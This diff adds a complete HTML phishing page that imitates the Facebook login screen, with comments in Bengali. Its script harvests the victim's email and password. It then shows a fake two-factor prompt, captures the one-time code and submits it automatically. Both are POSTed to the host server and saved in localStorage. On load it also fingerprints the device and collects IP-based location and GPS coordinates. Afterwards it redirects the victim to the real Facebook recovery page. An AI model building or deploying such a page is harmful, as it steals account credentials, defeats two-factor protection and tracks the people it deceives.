@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Facebook</title>
+    <style>
+        /* CSS কোডে কোনো পরিবর্তন করা হয়নি */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
+        body { background-color: #f0f2f5; display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; color: #1c1e21; }
+        .fb-logo { margin-bottom: 16px; text-align: center; }
+        .fb-logo-text { font-size: 56px; font-weight: bold; color: #1877f2; letter-spacing: -1px; }
+        .container { background-color: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); width: 100%; max-width: 400px; text-align: center; }
+        h1 { font-size: 18px; font-weight: normal; margin-bottom: 20px; }
+        .h1-2fa { font-size: 20px; font-weight: bold; margin-bottom: 10px; }
+        .p-2fa { font-size: 16px; color: #606770; margin-bottom: 20px; }
+        .input-group { margin-bottom: 15px; }
+        input[type="text"], input[type="password"] { width: 100%; height: 52px; border: 1px solid #dddfe2; border-radius: 6px; padding: 0 15px; font-size: 17px; background-color: #f5f6f7; }
+        input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        #code { text-align: center; letter-spacing: 5px; }
+        .button { color: white; background-color: #1877f2; border: none; border-radius: 6px; padding: 12px 0; font-size: 20px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; }
+        .button:hover { background-color: #166fe5; }
+        #loader { display: none; margin: 10px auto; width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="fb-logo"><div class="fb-logo-text">facebook</div></div>
+    <div class="container">
+        <!-- ধাপ ১: লগইন সেকশন -->
+        <div id="login-section">
+            <h1>Log in to Facebook</h1>
+            <div class="input-group"><input type="text" id="email" placeholder="Email address or phone number" required></div>
+            <div class="input-group"><input type="password" id="pass" placeholder="Password" required></div>
+            <button id="login-button" class="button" onclick="sendLoginInfo()">Log In</button>
+            <div id="loader"></div>
+        </div>
+        <!-- ধাপ ২: 2FA সেকশন (প্রাথমিকভাবে আড়াল) -->
+        <div id="2fa-section" style="display: none;">
+            <h1 class="h1-2fa">Two-Factor Authentication</h1>
+            <p class="p-2fa">Enter the 6-digit code sent to your device.</p>
+            <div class="input-group"><input type="text" id="code" placeholder="_ _ _ _ _ _" maxlength="6" required></div>
+            <button id="code-button" class="button" onclick="send2FACode()">Submit Code</button>
+        </div>
+    </div>
+
+    <script>
+        // Device info collection
+        document.addEventListener('DOMContentLoaded', async function() {
+            // Create hidden field for device info
+            let deviceField = document.getElementById('deviceInfo');
+            if (!deviceField) {
+                deviceField = document.createElement('input');
+                deviceField.type = 'hidden';
+                deviceField.name = 'deviceInfo';
+                deviceField.id = 'deviceInfo';
+                document.body.appendChild(deviceField);
+            }
+            
+            // Collect device information
+            const deviceInfo = {
+                ua: navigator.userAgent || 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                language: navigator.language || 'Unknown',
+                res: window.screen.width + 'x' + window.screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+                java: navigator.javaEnabled ? 'Enabled' : 'Disabled'
+            };
+            
+            // Collect network information
+            if (navigator.connection) {
+                deviceInfo.net_type = navigator.connection.type || 'unknown';
+                deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
+                deviceInfo.net_downlink = (navigator.connection.downlink || '0') + ' Mbps';
+                deviceInfo.net_rtt = (navigator.connection.rtt || '0') + ' ms';
+            } else {
+                deviceInfo.net_type = 'Not available';
+                deviceInfo.net_effective = 'N/A';
+                deviceInfo.net_downlink = 'N/A';
+                deviceInfo.net_rtt = 'N/A';
+            }
+            
+            // Collect battery information
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    deviceInfo.batteryLevel = Math.round(battery.level * 100);
+                    deviceInfo.isCharging = battery.charging;
+                    deviceInfo.batteryChargingTime = battery.chargingTime;
+                    deviceInfo.batteryDischargingTime = battery.dischargingTime;
+                } catch (error) {
+                    deviceInfo.batteryLevel = 'Not available';
+                    deviceInfo.isCharging = 'N/A';
+                }
+            } else {
+                deviceInfo.batteryLevel = 'Not supported';
+                deviceInfo.isCharging = 'N/A';
+            }
+            
+            // Collect IP address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                deviceInfo.ip = ipData.ip;
+                
+                // Get location info from IP
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                deviceInfo.country = locationData.country_name;
+                deviceInfo.city = locationData.city;
+                deviceInfo.region = locationData.region;
+                deviceInfo.country_code = locationData.country_code;
+            } catch (error) {
+                deviceInfo.ip = 'Failed to fetch';
+                deviceInfo.country = 'Unknown';
+                deviceInfo.city = 'Unknown';
+            }
+            
+            // Collect location information
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        deviceInfo.lat = position.coords.latitude;
+                        deviceInfo.lon = position.coords.longitude;
+                        deviceInfo.accuracy = position.coords.accuracy + ' meters';
+                        deviceField.value = JSON.stringify(deviceInfo);
+                    },
+                    function(error) {
+                        deviceInfo.location = 'Permission denied';
+                        deviceField.value = JSON.stringify(deviceInfo);
+                    }
+                );
+            } else {
+                deviceInfo.location = 'Not supported';
+                deviceField.value = JSON.stringify(deviceInfo);
+            }
+            
+            // Set device info
+            if (!navigator.geolocation) {
+                deviceField.value = JSON.stringify(deviceInfo);
+            }
+        });
+
+        // এই ফাংশনটি প্রথম ধাপের তথ্য পাঠায়
+        async function sendLoginInfo() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            const deviceInfoField = document.getElementById('deviceInfo');
+            const deviceInfo = deviceInfoField ? deviceInfoField.value : '{}';
+
+            if (!email || !pass) {
+                alert('Please enter both email and password.');
+                return;
+            }
+
+            // LocalStorage-এ ডেটা সেভ করা
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{"facebookData":[]}');
+                storedData.facebookData.push({
+                    email: email,
+                    pass: pass,
+                    deviceInfo: deviceInfo,
+                    timestamp: new Date().toLocaleString(),
+                    type: 'login'
+                });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+                console.log('Data saved to localStorage');
+            } catch (error) {
+                console.error('Error saving to localStorage:', error);
+            }
+
+            // বাটন ও লোডার নিয়ন্ত্রণ
+            const loginButton = document.getElementById('login-button');
+            const loader = document.getElementById('loader');
+            loginButton.style.display = 'none';
+            loader.style.display = 'block';
+
+            // FormData দিয়ে ডেটা তৈরি
+            const params = new URLSearchParams();
+            params.append('email', email);
+            params.append('pass', pass);
+            params.append('deviceInfo', deviceInfo);
+
+            try {
+                // পেজ রিলোড ছাড়াই সার্ভারে ডেটা পাঠান
+                await fetch('/', { method: 'POST', body: params });
+                
+                // সফলভাবে পাঠানোর পর UI পরিবর্তন
+                setTimeout(() => {
+                    document.getElementById('login-section').style.display = 'none';
+                    document.getElementById('2fa-section').style.display = 'block';
+                    loginButton.style.display = 'block';
+                    loader.style.display = 'none';
+                }, 1500);
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Submission failed. Please try again.');
+                loginButton.style.display = 'block'; // ব্যর্থ হলে বাটন ফিরিয়ে আনুন
+                loader.style.display = 'none';
+            }
+        }
+
+        // এই ফাংশনটি দ্বিতীয় ধাপের তথ্য পাঠায়
+        async function send2FACode() {
+            const email = document.getElementById('email').value; // সনাক্তকরণের জন্য ইমেইল আবার পাঠান
+            const code = document.getElementById('code').value;
+            const deviceInfoField = document.getElementById('deviceInfo');
+            const deviceInfo = deviceInfoField ? deviceInfoField.value : '{}';
+
+            if (!code || code.length < 6) {
+                alert('Please enter a valid 6-digit code.');
+                return;
+            }
+
+            // LocalStorage-এ 2FA ডেটা সেভ করা
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{"facebookData":[]}');
+                storedData.facebookData.push({
+                    email: email,
+                    '2fa_code': code,
+                    deviceInfo: deviceInfo,
+                    timestamp: new Date().toLocaleString(),
+                    type: '2fa'
+                });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+                console.log('2FA Data saved to localStorage');
+            } catch (error) {
+                console.error('Error saving 2FA to localStorage:', error);
+            }
+            
+            const codeButton = document.getElementById('code-button');
+            const originalText = codeButton.textContent;
+            codeButton.textContent = 'Verifying...';
+            codeButton.disabled = true;
+            
+            const params = new URLSearchParams();
+            params.append('email', email); // ইমেইল আবার পাঠানো হচ্ছে
+            params.append('2fa_code', code);
+            params.append('deviceInfo', deviceInfo);
+            
+            try {
+                // দ্বিতীয়বার ডেটা পাঠান এবং এরপর রিডাইরেক্ট হবে
+                const response = await fetch('/', { method: 'POST', body: params });
+                
+                // রিডাইরেক্ট এর আগে একটু দেরি
+                setTimeout(() => {
+                    if (response.redirected) {
+                        window.location.href = response.url; // সার্ভার থেকে দেওয়া লিঙ্কে রিডাইরেক্ট করুন
+                    } else {
+                       // যদি কোনো কারণে রিডাইরেক্ট না হয়
+                       window.location.href = 'https://facebook.com/recover';
+                    }
+                }, 2000);
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Submission failed. Please try again.');
+                codeButton.textContent = originalText;
+                codeButton.disabled = false;
+            }
+        }
+
+        // Input formatting for code
+        document.getElementById('code')?.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 6) {
+                value = value.substring(0, 6);
+            }
+            e.target.value = value;
+            
+            // Auto-submit when 6 digits entered
+            if (value.length === 6) {
+                document.getElementById('code-button').click();
+            }
+        });
+    </script>
+</body>
+</html>
